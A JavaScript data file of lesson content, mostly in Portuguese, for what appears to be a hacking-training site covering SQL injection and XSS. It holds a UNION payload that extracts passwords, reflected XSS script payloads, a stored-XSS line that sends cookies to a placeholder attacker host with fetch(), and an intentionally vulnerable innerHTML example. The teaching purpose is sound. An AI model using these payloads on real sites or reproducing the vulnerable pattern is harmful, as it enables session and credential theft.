export const learningPathsData = [
  {
    id: "270325750379450368",
    labId: "102", // ID do Lab de SQLi no Banco
    title: "SQL Injection Mastery",
    description: "Learn to identify and exploit SQL injection vulnerabilities.",
    difficulty: "Medium",
    duration: "4h",
    students: 12500,
    modules: 3,
    labUrl: "/lab/sql-injection-1",
    modulesContent: [
      {
        title: "Understanding SQL Injection",
        content: `
## O que é SQL Injection?
SQL injection é uma técnica de injeção de código que explora vulnerabilidades de segurança no software de um aplicativo.

### O Básico
Antes de se aprofundar na exploração, é crucial entender como funcionam os bancos de dados SQL.
\\\`sql
SELECT * FROM users WHERE username = 'admin';
\\\`
        `
      },
      {
        title: "In-Band SQLi (Clássico)",
        content: `
## In-Band SQLi
O atacante utiliza o mesmo canal de comunicação para lançar ataques e coletar resultados.

### Union Based
Utilizando o operador UNION para combinar resultados.
\\\`sql
' UNION SELECT username, password FROM users--
\\\`
        `
      },
      {
        title: "Blind SQL Injection",
        content: `
## Blind SQLi
O atacante envia payloads e observa o comportamento do aplicativo em vez de visualizar os dados diretamente.
        `
      }
    ]
  },
  {
    id: "270325625460494336",
    labId: "101",
    title: "Cross-Site Scripting (XSS)",
    difficulty: "Easy",
    labUrl: "/lab/xss-1",
    modulesContent: [
      {
        title: "Introdução ao XSS",
        sections: [
          {
            title: "O que é Cross-Site Scripting?",
            content: "XSS é uma vulnerabilidade que permite injetar scripts maliciosos em páginas web visualizadas por outros usuários. É como se você forçasse o site a dizer algo que ele não deveria."
          },
          {
            title: "Como funciona?",
            content: "O ataque acontece quando dados não confiáveis são enviados ao navegador sem validação.\n\n```javascript\n// Exemplo clássico de payload\nalert('Hacked by Pwnned');\n```"
          }
        ]
      },
      {
        title: "XSS Refletido",
        sections: [
          {
            title: "Entendendo o XSS Refletido",
            content: "O ocorre quando o script é 'refletido' de uma requisição HTTP. O payload não fica salvo no servidor, ele apenas 'bate e volta'.\n\n```html\n[https://site.vulneravel.com/search?term=](https://site.vulneravel.com/search?term=)<script>confirm('XSS')</script>\n```"
          }
        ]
      },
      {
        title: "Stored XSS (Persistente)",
        sections: [
          {
            title: "O Perigo do Armazenamento",
            content: "Diferente do refletido, o Stored XSS ocorre quando o payload é salvo permanentemente no banco de dados do servidor (em comentários, perfis de usuário, posts de fórum, etc)."
          },
          {
            title: "Vetor de Ataque",
            content: "Qualquer usuário que visualizar a página onde o dado foi salvo executará o script automaticamente. É um dos tipos mais perigosos de XSS.\n\n```html\n\n<script>fetch('[https://atacker.com/steal?cookie=](https://atacker.com/steal?cookie=)' + document.cookie);</script>\n```"
          }
        ]
      },
      {
        title: "DOM-based XSS",
        sections: [
          {
            title: "Vulnerabilidade no Client-Side",
            content: "O DOM-based XSS acontece inteiramente no navegador. O servidor não recebe o payload; a falha está na forma como o JavaScript da página processa dados da URL ou de outras fontes locais."
          },
          {
            title: "Sinks e Sources",
            content: "O ataque ocorre quando uma 'Source' (como location.hash) flui para um 'Sink' perigoso (como innerHTML) sem limpeza.\n\n```javascript\n// Exemplo de código vulnerável\nconst name = new URLSearchParams(window.location.search).get('name');\ndocument.getElementById('greeting').innerHTML = 'Hello, ' + name;\n```"
          }
        ]
      }
    ]
  }
];